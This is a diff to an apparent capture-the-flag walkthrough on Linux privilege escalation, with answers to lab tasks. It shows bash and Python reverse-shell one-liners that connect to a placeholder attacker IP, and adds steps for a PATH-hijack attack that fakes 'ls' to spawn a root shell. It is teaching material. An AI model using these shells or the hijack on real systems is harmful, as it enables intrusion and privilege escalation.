@@ -189,10 +189,63 @@ In order to get a cleaner looking shell (known as TTY shell), try spawning one v
 
 ![](/Common%20Linux%20Privesc/images/spawn_ttyshell.png)
 
-## Alterantive Way without MSFVenom
+## Alternative Way without MSFVenom
 
 Can create a shell without generating a payload using MSFVenom either through Bash, Python or other means
 
 * Bash - `bash -i >& /dev/tcp/<IP>/8888 0>&1`
 * Python - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker ip>",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
 
+![](/Common%20Linux%20Privesc/images/python_shell.png)
+
+## Task 9.1 - no answer needed
+
+Login as user5 with the password `password` using the `su -l user5` command
+
+## Task 9.2
+
+### Q: Go to user5's home directory and run the file `script`. What command is it executing?
+
+A: `ls`
+
+Walkthrough: When ran, it lists the files. To list in files in Linux, the `ls` command is used
+
+![](/Common%20Linux%20Privesc/images/script_ls.png)
+
+## Task 9.3 - no answer needed
+
+Now we know what command to imitate, change directory to /tmp
+
+## Task 9.4
+
+Now, create an imitation executable. The format is:
+
+* `echo "<command>"" > <name of executable we imitate>`
+
+### Q: What would the command look like to open a bash shell, writing to a file with the name of the executable we are imitating?
+
+A: echo "/bin/bash" > ls
+
+Walkthrough: `/bin/bash` is the command and `ls` is the command we are imitating
+
+## Task 9.5
+
+Now that the imitation is made, make it an executable
+
+### Q: What command do you use?
+
+A: chmod +x ls
+
+## Task 9.6 - no answer needed
+
+Next, you need to change the PATH variable, so it points to the directory where we have our imitation "ls". Done via the `export PATH=/tmp:$PATH` command
+
+This will cause you to open a shell every time you use `ls`. To use the proper `ls` command, use `/bin/ls` instead
+
+To reset the PATH variable, simply type `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH`
+
+## Task 9.7
+
+Change back to the home directory and run the `script` file again
+
+![](/Common%20Linux%20Privesc/images/root_PATH.png)
